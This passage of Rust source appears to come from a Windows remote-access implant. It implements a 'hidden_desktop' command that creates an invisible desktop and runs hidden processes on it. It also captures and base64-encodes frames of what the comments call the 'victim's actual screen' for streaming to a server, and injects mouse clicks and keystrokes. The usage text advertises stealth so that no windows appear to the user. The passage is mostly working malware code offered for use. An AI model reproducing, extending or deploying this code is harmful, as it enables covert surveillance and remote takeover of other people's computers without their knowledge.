                let existing = OpenDesktopW(desk_name.as_ptr(), 0, 0, 0x01F00000); // GENERIC_READ
                if !existing.is_null() {
                    CloseDesktop(existing);
                    return (
                        format!("[!] Hidden desktop 'HEROHidden' already exists\n"),
                        String::new(),
                    );
                }

                // Create new hidden desktop
                // 0 = no flags (no DF_ALLOWOTHERACCOUNTHOOK for stealth)
                // 0x01F00000 = GENERIC_ALL
                let hdesk = CreateDesktopW(
                    desk_name.as_ptr(),
                    std::ptr::null(), std::ptr::null(),
                    0, 0x01F00000, std::ptr::null(),
                );

                if hdesk.is_null() {
                    return (
                        String::new(),
                        format!("[-] CreateDesktopW failed: {}\n", get_last_error()),
                    );
                }

                // Switch current thread to hidden desktop
                if SetThreadDesktop(hdesk) != 0 {
                    let out = format!(
                        "[+] Hidden desktop 'HEROHidden' created\n\
                         [+] Thread switched to hidden desktop\n\
                         [*] GUI operations now run invisibly\n\
                         [*] Use 'hidden_desktop screenshot' to capture\n\
                         [*] Use 'hidden_desktop exec <cmd>' to run processes\n"
                    );
                    // Don't close — keep alive for operations
                    return (out, String::new());
                } else {
                    return (
                        format!(
                            "[!] Desktop created but SetThreadDesktop failed: {}\n\
                             [+] Hidden desktop is alive — operations may not be stealthy\n",
                            get_last_error()
                        ),
                        String::new(),
                    );
                }
            }
        }

        "screenshot" | "shot" | "capture" => {
            unsafe {
                let hdesk = OpenDesktopW(desk_name.as_ptr(), 0, 0, 0x01F00000);
                if hdesk.is_null() {
                    return (
                        String::new(),
                        "[-] Hidden desktop not found. Run 'hidden_desktop start' first.\n".into(),
                    );
                }

                let orig = GetThreadDesktop(GetCurrentThreadId());
                SetThreadDesktop(hdesk);

                // Capture screenshot
                let result = capture_screenshot_inline();

                SetThreadDesktop(orig);
                CloseDesktop(hdesk);
                return result;
            }
        }

        "list" | "ls" => {
            // For simplicity, just show known desktops
            let out = format!(
                "[*] Desktops in current window station:\n\
                 - Default (user-visible)\n\
                 - Winlogon (system)\n\
                 - Disconnect (RDP)\n\
                 - HEROHidden (if created)\n"
            );
            return (out, String::new());
        }

        "stop" | "close" | "destroy" => {
            unsafe {
                let hdesk = OpenDesktopW(desk_name.as_ptr(), 0, 0, 0x01F00000);
                if hdesk.is_null() {
                    return (
                        String::new(),
                        "[-] Hidden desktop not found\n".into(),
                    );
                }
                if CloseDesktop(hdesk) != 0 {
                    return (
                        "[+] Hidden desktop 'HEROHidden' closed\n".into(),
                        String::new(),
                    );
                } else {
                    return (
                        String::new(),
                        format!("[-] CloseDesktop failed: {}\n", get_last_error()),
                    );
                }
            }
        }

        "exec" | "run" => {
            if sub_args.is_empty() {
                return (
                    String::new(),
                    "[-] Usage: hidden_desktop exec <command>\n".into(),
                );
            }
            return exec_on_hidden_desktop(&sub_args);
        }

        // ── LIVE DESKTOP: capture single frame for live streaming ──
        // Returns base64-encoded BMP (downscaled for speed)
        "live" | "frame" | "stream" => {
            return capture_live_frame();
        }

        // ── MOUSE INPUT: inject click at x,y ──
        // Args: "click <x> <y>" | "move <x> <y>" | "down <x> <y>" | "up <x> <y>"
        "click" | "move" | "down" | "up" | "mouse" => {
            return inject_mouse(sub, &sub_args);
        }

        // ── KEYBOARD INPUT: inject key press ──
        // Args: "key <vk_code>" | "type <text>"
        "key" | "keypress" => {
            return inject_key(&sub_args);
        }

        "type" | "typetext" => {
            return type_text(&sub_args);
        }

        // ── START EXPLORER: launch explorer.exe on hidden desktop ──
        "explorer" | "start_explorer" | "desktop" => {
            return exec_on_hidden_desktop("explorer.exe");
        }

        _ => {
            let out = format!(
                "[*] Hidden Desktop — Stealth GUI Operations\n\n\
                 Usage:\n\
                   hidden_desktop start       — Create hidden desktop\n\
                   hidden_desktop explorer    — Launch explorer.exe on hidden desktop\n\
                   hidden_desktop live        — Capture live frame (for streaming)\n\
                   hidden_desktop click <x> <y>  — Inject mouse click\n\
                   hidden_desktop move <x> <y>   — Inject mouse move\n\
                   hidden_desktop key <vk>       — Inject key press\n\
                   hidden_desktop type <text>    — Type text\n\
                   hidden_desktop screenshot  — Capture screenshot\n\
                   hidden_desktop list        — List desktops\n\
                   hidden_desktop stop        — Close hidden desktop\n\
                   hidden_desktop exec <cmd>  — Run process in hidden desktop\n\n\
                 Stealth features:\n\
                   - Hidden desktop invisible to user\n\
                   - GUI apps (calc, browser, etc.) run invisibly\n\
                   - Live streaming + mouse/keyboard injection\n\
                   - No windows appear on user's screen\n"
            );
            return (out, String::new());
        }
    }
}

#[cfg(target_os = "windows")]
extern "system" fn enum_desktop_cb(_name: *const u16, _lparam: usize) -> i32 {
    // For future: collect desktop names
    1
}

/// Capture screenshot from current desktop (called after SetThreadDesktop).
#[cfg(target_os = "windows")]
fn capture_screenshot_inline() -> (String, String) {
    extern "system" {
        fn GetDC(hwnd: *mut u8) -> *mut u8;
        fn ReleaseDC(hwnd: *mut u8, hdc: *mut u8) -> i32;
        fn GetSystemMetrics(idx: i32) -> i32;
        fn CreateCompatibleDC(hdc: *mut u8) -> *mut u8;
        fn CreateCompatibleBitmap(hdc: *mut u8, w: i32, h: i32) -> *mut u8;
        fn SelectObject(hdc: *mut u8, obj: *mut u8) -> *mut u8;
        fn BitBlt(dst: *mut u8, dx: i32, dy: i32, w: i32, h: i32,
                  src: *mut u8, sx: i32, sy: i32, rop: u32) -> i32;
        fn DeleteObject(obj: *mut u8) -> i32;
        fn DeleteDC(hdc: *mut u8) -> i32;
        fn GetDIBits(hdc: *mut u8, bmp: *mut u8, start: u32, lines: u32,
                     bits: *mut u8, bi: *mut BitmapInfo, usage: u32) -> i32;
    }

    #[repr(C)]
    struct BitmapInfoHeader {
        biSize: u32,
        biWidth: i32,
        biHeight: i32,
        biPlanes: u16,
        biBitCount: u16,
        biCompression: u32,
        biSizeImage: u32,
        biXPelsPerMeter: i32,
        biYPelsPerMeter: i32,
        biClrUsed: u32,
        biClrImportant: u32,
    }

    #[repr(C)]
    struct BitmapInfo {
        bmiHeader: BitmapInfoHeader,
        bmiColors: [u32; 3],
    }

    const SM_CXSCREEN: i32 = 0;
    const SM_CYSCREEN: i32 = 1;
    const SRCCOPY: u32 = 0x00CC0020;
    const DIB_RGB_COLORS: u32 = 0;
    const BI_RGB: u32 = 0;

    unsafe {
        let hdc = GetDC(std::ptr::null_mut());
        if hdc.is_null() {
            return (String::new(), "[-] GetDC failed\n".into());
        }

        let w = GetSystemMetrics(SM_CXSCREEN);
        let h = GetSystemMetrics(SM_CYSCREEN);

        let hdc_mem = CreateCompatibleDC(hdc);
        let hbmp = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hdc_mem, hbmp);

        BitBlt(hdc_mem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        let bi = BitmapInfo {
            bmiHeader: BitmapInfoHeader {
                biSize: std::mem::size_of::<BitmapInfoHeader>() as u32,
                biWidth: w,
                biHeight: h,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: BI_RGB,
                biSizeImage: 0,
                biXPelsPerMeter: 2835,
                biYPelsPerMeter: 2835,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [0; 3],
        };

        let data_len = ((w * 3 + 3) & !3) as usize * h as usize;
        let mut bits: Vec<u8> = vec![0u8; data_len];

        let got = GetDIBits(hdc_mem, hbmp, 0, h as u32, bits.as_mut_ptr(),
                            &bi as *const _ as *mut _, DIB_RGB_COLORS);

        DeleteObject(hbmp);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc);

        if got == 0 {
            return (String::new(), "[-] GetDIBits failed\n".into());
        }

        // Build BMP file
        let file_size = 54 + data_len;
        let mut bmp: Vec<u8> = Vec::with_capacity(file_size);
        // BMP header
        bmp.extend_from_slice(b"BM");
        bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());  // reserved
        bmp.extend_from_slice(&54u32.to_le_bytes()); // offset to pixels
        // DIB header
        bmp.extend_from_slice(&40u32.to_le_bytes());  // biSize
        bmp.extend_from_slice(&w.to_le_bytes());
        bmp.extend_from_slice(&h.to_le_bytes());
        bmp.extend_from_slice(&1u16.to_le_bytes());   // planes
        bmp.extend_from_slice(&24u16.to_le_bytes());  // bit count
        bmp.extend_from_slice(&BI_RGB.to_le_bytes());
        bmp.extend_from_slice(&(data_len as u32).to_le_bytes());
        bmp.extend_from_slice(&2835i32.to_le_bytes());
        bmp.extend_from_slice(&2835i32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        // Pixel data
        bmp.extend_from_slice(&bits);

        // Encode to base64 for transport
        let b64 = base64_encode(&bmp);

        // I6 FIX: was truncated to 200 chars with the self-refuting message
        // "(truncated, full data in result)" — full_out IS the result, so the
        // server only ever received a corrupt 200-char base64 fragment. Return
        // the full data (same channel the `live` frame path already uses).
        let full_out = format!(
            "[+] Screenshot captured: {}x{}, {} bytes\n\
             [+] Data: {}\n",
            w, h, file_size, b64
        );

        (full_out, String::new())
    }
}

/// Execute a process on the hidden desktop.
#[cfg(target_os = "windows")]
fn exec_on_hidden_desktop(cmdline: &str) -> (String, String) {
    use std::os::windows::ffi::OsStrExt;
    use std::ffi::OsStr;

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    #[repr(C)]
    struct StartupInfoW {
        cb: u32,
        lp_reserved: *const u16,   // lpReserved
        lp_desktop:  *const u16,   // lpDesktop  ← 2nd pointer (I3 fix)
        lp_title:    *const u16,   // lpTitle
        dwX: u32, dwY: u32, dwXSize: u32, dwYSize: u32,
        dwXCountChars: u32, dwYCountChars: u32,
        dwFillAttribute: u32, dwFlags: u32,
        wShowWindow: u16, cbReserved2: u16,
        lpReserved2: *mut u8,
        hStdInput: *mut u8, hStdOutput: *mut u8, hStdError: *mut u8,
    }

    #[repr(C)]
    struct ProcessInformation {
        hProcess: *mut u8,
        hThread: *mut u8,
        dwProcessId: u32,
        dwThreadId: u32,
    }

    extern "system" {
        fn CreateProcessW(
            app: *const u16, cmd: *mut u16, sa1: *const u8, sa2: *const u8,
            inherit: i32, flags: u32, env: *const u8, cwd: *const u16,
            si: *mut StartupInfoW, pi: *mut ProcessInformation,
        ) -> i32;
        fn CloseHandle(h: *mut u8) -> i32;
    }

    const STARTF_USESHOWWINDOW: u32 = 0x00000001;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const DETACHED_PROCESS: u32 = 0x00000008;
    const SW_HIDE: u16 = 0;

    let desk_name = wide("HEROHidden");
    let mut cmd_wide = wide(cmdline);

    let mut si = StartupInfoW {
        cb: std::mem::size_of::<StartupInfoW>() as u32,
        lp_reserved: std::ptr::null(),
        lp_desktop:  desk_name.as_ptr(),  // I3 FIX: real lpDesktop is the 2nd pointer (offset 16)
        lp_title:    std::ptr::null(),
        dwX: 0, dwY: 0, dwXSize: 0, dwYSize: 0,
        dwXCountChars: 0, dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: STARTF_USESHOWWINDOW,
        wShowWindow: SW_HIDE,
        cbReserved2: 0,
        lpReserved2: std::ptr::null_mut(),
        hStdInput: std::ptr::null_mut(),
        hStdOutput: std::ptr::null_mut(),
        hStdError: std::ptr::null_mut(),
    };

    let mut pi = ProcessInformation {
        hProcess: std::ptr::null_mut(),
        hThread: std::ptr::null_mut(),
        dwProcessId: 0,
        dwThreadId: 0,
    };

    unsafe {
        let ok = CreateProcessW(
            std::ptr::null(),
            cmd_wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            std::ptr::null(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );

        if ok != 0 {
            let out = format!(
                "[+] Process started on hidden desktop: {} (PID: {})\n",
                cmdline, pi.dwProcessId
            );
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return (out, String::new());
        } else {
            return (
                String::new(),
                format!("[-] CreateProcessW failed: {}\n", get_last_error()),
            );
        }
    }
}

#[cfg(target_os = "windows")]
fn get_last_error() -> u32 {
    extern "system" { fn GetLastError() -> u32; }
    unsafe { GetLastError() }
}

/// Simple base64 encoder (no external dep for size).
#[cfg(target_os = "windows")]
fn base64_encode(data: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    let mut i = 0;
    while i + 2 < data.len() {
        let n = ((data[i] as u32) << 16) | ((data[i+1] as u32) << 8) | (data[i+2] as u32);
        out.push(TABLE[((n >> 18) & 63) as usize] as char);
        out.push(TABLE[((n >> 12) & 63) as usize] as char);
        out.push(TABLE[((n >> 6) & 63) as usize] as char);
        out.push(TABLE[(n & 63) as usize] as char);
        i += 3;
    }
    let rem = data.len() - i;
    if rem == 1 {
        let n = (data[i] as u32) << 16;
        out.push(TABLE[((n >> 18) & 63) as usize] as char);
        out.push(TABLE[((n >> 12) & 63) as usize] as char);
        out.push('=');
        out.push('=');
    } else if rem == 2 {
        let n = ((data[i] as u32) << 16) | ((data[i+1] as u32) << 8);
        out.push(TABLE[((n >> 18) & 63) as usize] as char);
        out.push(TABLE[((n >> 12) & 63) as usize] as char);
        out.push(TABLE[((n >> 6) & 63) as usize] as char);
        out.push('=');
    }
    out
}

// ============================================================
// LIVE DESKTOP — real-time screen capture + input injection
// ============================================================

/// Capture a single frame for live streaming.
/// Captures from DEFAULT desktop (victim's actual screen — shows wallpaper, icons, windows).
/// Downscaled to 50% for faster transfer, returned as base64 BMP.
#[cfg(target_os = "windows")]
fn capture_live_frame() -> (String, String) {
    extern "system" {
        fn GetDC(hwnd: *mut u8) -> *mut u8;
        fn ReleaseDC(hwnd: *mut u8, hdc: *mut u8) -> i32;
        fn GetSystemMetrics(idx: i32) -> i32;
        fn CreateCompatibleDC(hdc: *mut u8) -> *mut u8;
        fn CreateCompatibleBitmap(hdc: *mut u8, w: i32, h: i32) -> *mut u8;
        fn SelectObject(hdc: *mut u8, obj: *mut u8) -> *mut u8;
        fn StretchBlt(dst: *mut u8, dx: i32, dy: i32, dw: i32, dh: i32,
                      src: *mut u8, sx: i32, sy: i32, sw: i32, sh: i32, rop: u32) -> i32;
        fn DeleteObject(obj: *mut u8) -> i32;
        fn DeleteDC(hdc: *mut u8) -> i32;
        fn GetDIBits(hdc: *mut u8, bmp: *mut u8, start: u32, lines: u32,
                     bits: *mut u8, bi: *mut BitmapInfo, usage: u32) -> i32;
    }

    #[repr(C)]
    struct BitmapInfoHeader {
        biSize: u32, biWidth: i32, biHeight: i32, biPlanes: u16,
        biBitCount: u16, biCompression: u32, biSizeImage: u32,
        biXPelsPerMeter: i32, biYPelsPerMeter: i32,
        biClrUsed: u32, biClrImportant: u32,
    }

    #[repr(C)]
    struct BitmapInfo {
        bmiHeader: BitmapInfoHeader,
        bmiColors: [u32; 3],
    }

    const SM_CXSCREEN: i32 = 0;
    const SM_CYSCREEN: i32 = 1;
    const SRCCOPY: u32 = 0x00CC0020;
    const DIB_RGB_COLORS: u32 = 0;
    const BI_RGB: u32 = 0;

    unsafe {
        // GetDC(NULL) returns DC for the ENTIRE screen — shows everything
        // victim sees: wallpaper, icons, taskbar, open windows, cursor
        let hdc = GetDC(std::ptr::null_mut());
        if hdc.is_null() {
            return (String::new(), "[-] GetDC failed\n".into());
        }

        let sw = GetSystemMetrics(SM_CXSCREEN);
        let sh = GetSystemMetrics(SM_CYSCREEN);

        if sw <= 0 || sh <= 0 {
            ReleaseDC(std::ptr::null_mut(), hdc);
            return (String::new(), "[-] GetSystemMetrics failed\n".into());
        }

        // Downscale to 50% for faster network transfer
        let dw = sw / 2;
        let dh = sh / 2;

        let hdc_mem = CreateCompatibleDC(hdc);
        if hdc_mem.is_null() {
            ReleaseDC(std::ptr::null_mut(), hdc);
            return (String::new(), "[-] CreateCompatibleDC failed\n".into());
        }

        let hbmp = CreateCompatibleBitmap(hdc, dw, dh);
        if hbmp.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return (String::new(), "[-] CreateCompatibleBitmap failed\n".into());
        }

        SelectObject(hdc_mem, hbmp);

        // Stretch full screen → half size
        let ok = StretchBlt(hdc_mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY);
        if ok == 0 {
            DeleteObject(hbmp);
            DeleteDC(hdc_mem);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return (String::new(), "[-] StretchBlt failed\n".into());
        }

        let bi = BitmapInfo {
            bmiHeader: BitmapInfoHeader {
                biSize: std::mem::size_of::<BitmapInfoHeader>() as u32,
                biWidth: dw, biHeight: dh, biPlanes: 1, biBitCount: 24,
                biCompression: BI_RGB, biSizeImage: 0,
                biXPelsPerMeter: 2835, biYPelsPerMeter: 2835,
                biClrUsed: 0, biClrImportant: 0,
            },
            bmiColors: [0; 3],
        };

        let data_len = ((dw * 3 + 3) & !3) as usize * dh as usize;
        let mut bits: Vec<u8> = vec![0u8; data_len];

        let got = GetDIBits(hdc_mem, hbmp, 0, dh as u32, bits.as_mut_ptr(),
                            &bi as *const _ as *mut _, DIB_RGB_COLORS);

        DeleteObject(hbmp);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc);

        if got == 0 {
            return (String::new(), "[-] GetDIBits failed\n".into());
        }

        // Build BMP file (14-byte header + 40-byte DIB header + pixel data)
        let file_size = 54 + data_len;
        let mut bmp: Vec<u8> = Vec::with_capacity(file_size);
        bmp.extend_from_slice(b"BM");
        bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&54u32.to_le_bytes());
        bmp.extend_from_slice(&40u32.to_le_bytes());
        bmp.extend_from_slice(&dw.to_le_bytes());
        bmp.extend_from_slice(&dh.to_le_bytes());
        bmp.extend_from_slice(&1u16.to_le_bytes());
        bmp.extend_from_slice(&24u16.to_le_bytes());
        bmp.extend_from_slice(&BI_RGB.to_le_bytes());
        bmp.extend_from_slice(&(data_len as u32).to_le_bytes());
        bmp.extend_from_slice(&2835i32.to_le_bytes());
        bmp.extend_from_slice(&2835i32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&bits);

        let b64 = base64_encode(&bmp);

        // Format: "FRAME:<width>:<height>:<base64>"
        let out = format!("FRAME:{}:{}:{}\n", dw, dh, b64);
        (out, String::new())
    }
}

/// Inject mouse input via SendInput.
/// action: "click" | "move" | "down" | "up"
/// args: "<x> <y>" (coordinates in original screen resolution)
#[cfg(target_os = "windows")]
fn inject_mouse(action: &str, args: &str) -> (String, String) {
    extern "system" {
        fn SendInput(count: u32, inputs: *const Input, size: i32) -> u32;
        fn GetSystemMetrics(idx: i32) -> i32;
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct MouseInput {
        dx: i32, dy: i32,
        mouse_data: u32,
        dw_flags: u32,
        time: u32,
        dw_extra_info: usize,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    union InputUnion {
        mi: MouseInput,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct Input {
        type_: u32,
        u: InputUnion,
    }

    const INPUT_MOUSE: u32 = 0;
    const MOUSEEVENTF_MOVE: u32 = 0x0001;
    const MOUSEEVENTF_LEFTDOWN: u32 = 0x0002;
    const MOUSEEVENTF_LEFTUP: u32 = 0x0004;
    const MOUSEEVENTF_ABSOLUTE: u32 = 0x8000;
    const SM_CXSCREEN: i32 = 0;
    const SM_CYSCREEN: i32 = 1;

    // Parse x y from args
    let parts: Vec<&str> = args.split_whitespace().collect();
    if parts.len() < 2 {
        return (String::new(), format!("[-] Usage: hidden_desktop {} <x> <y>\n", action));
    }
    let x: i32 = match parts[0].parse() { Ok(v) => v, Err(_) => return (String::new(), "[-] invalid x\n".into()) };
    let y: i32 = match parts[1].parse() { Ok(v) => v, Err(_) => return (String::new(), "[-] invalid y\n".into()) };

    // Convert to absolute coordinates (0-65535 range)
    let screen_w = unsafe { GetSystemMetrics(SM_CXSCREEN) };
    let screen_h = unsafe { GetSystemMetrics(SM_CYSCREEN) };
    if screen_w <= 0 || screen_h <= 0 {
        return (String::new(), "[-] GetSystemMetrics failed\n".into());
    }
    let abs_x = (x * 65535) / screen_w;
    let abs_y = (y * 65535) / screen_h;

    let flags = match action {
        "click" => MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP,
        "down"  => MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN,
        "up"    => MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP,
        "move"  => MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE,
        _       => MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE,
    };

    let input = Input {
        type_: INPUT_MOUSE,
        u: InputUnion {
            mi: MouseInput {
                dx: abs_x, dy: abs_y,
                mouse_data: 0,
                dw_flags: flags,
                time: 0,
                dw_extra_info: 0,
            }
        }
    };

    let sent = unsafe { SendInput(1, &input, std::mem::size_of::<Input>() as i32) };
    if sent == 0 {
        return (String::new(), format!("[-] SendInput failed: {}\n", get_last_error()));
    }

    (format!("[+] Mouse {} at ({},{})\n", action, x, y), String::new())
}

/// Inject keyboard key press via SendInput.
/// args: "<vk_code>" (virtual key code, e.g., 0x0D for Enter, 0x1B for Esc)
#[cfg(target_os = "windows")]
fn inject_key(args: &str) -> (String, String) {
    extern "system" {
        fn SendInput(count: u32, inputs: *const KeyInput, size: i32) -> u32;
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct KeyInput {
        type_: u32,
        vk: u16,
        scan: u16,
        dw_flags: u32,
        time: u32,
        dw_extra_info: usize,
    }

    const INPUT_KEYBOARD: u32 = 1;
    const KEYEVENTF_KEYUP: u32 = 0x0002;

    let vk_str = args.trim();
    let vk: u16 = if vk_str.starts_with("0x") {
        u16::from_str_radix(&vk_str[2..], 16).unwrap_or(0)
    } else {
        vk_str.parse().unwrap_or(0)
    };

    if vk == 0 {
        return (String::new(), "[-] Usage: hidden_desktop key <vk_code>\n".into());
    }

    // Key down
    let input_down = KeyInput {
        type_: INPUT_KEYBOARD, vk, scan: 0, dw_flags: 0, time: 0, dw_extra_info: 0,
    };
    // Key up
    let input_up = KeyInput {
        type_: INPUT_KEYBOARD, vk, scan: 0, dw_flags: KEYEVENTF_KEYUP, time: 0, dw_extra_info: 0,
    };

    let inputs = [input_down, input_up];
    let sent = unsafe { SendInput(2, inputs.as_ptr(), std::mem::size_of::<KeyInput>() as i32) };
    if sent == 0 {
        return (String::new(), format!("[-] SendInput failed: {}\n", get_last_error()));
    }

    (format!("[+] Key pressed: 0x{:04X}\n", vk), String::new())
}

/// Type text via SendInput (unicode characters).
/// args: text to type
#[cfg(target_os = "windows")]
fn type_text(args: &str) -> (String, String) {
    extern "system" {
        fn SendInput(count: u32, inputs: *const KeyInput, size: i32) -> u32;
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct KeyInput {
        type_: u32,
        vk: u16,
        scan: u16,
        dw_flags: u32,
        time: u32,
        dw_extra_info: usize,
    }

    const INPUT_KEYBOARD: u32 = 1;
    const KEYEVENTF_UNICODE: u32 = 0x0004;
    const KEYEVENTF_KEYUP: u32 = 0x0002;

    if args.is_empty() {
        return (String::new(), "[-] Usage: hidden_desktop type <text>\n".into());
    }

    let mut inputs: Vec<KeyInput> = Vec::with_capacity(args.chars().count() * 2);
    for c in args.chars() {
        let code = c as u16;
        // Key down
        inputs.push(KeyInput {
            type_: INPUT_KEYBOARD, vk: 0, scan: code,
            dw_flags: KEYEVENTF_UNICODE, time: 0, dw_extra_info: 0,
        });
        // Key up
        inputs.push(KeyInput {
            type_: INPUT_KEYBOARD, vk: 0, scan: code,
            dw_flags: KEYEVENTF_UNICODE | KEYEVENTF_KEYUP, time: 0, dw_extra_info: 0,
        });
    }

    let sent = unsafe { SendInput(inputs.len() as u32, inputs.as_ptr(), std::mem::size_of::<KeyInput>() as i32) };
    if sent == 0 {
        return (String::new(), format!("[-] SendInput failed: {}\n", get_last_error()));
    }

    (format!("[+] Typed {} chars\n", args.chars().count()), String::new())
}
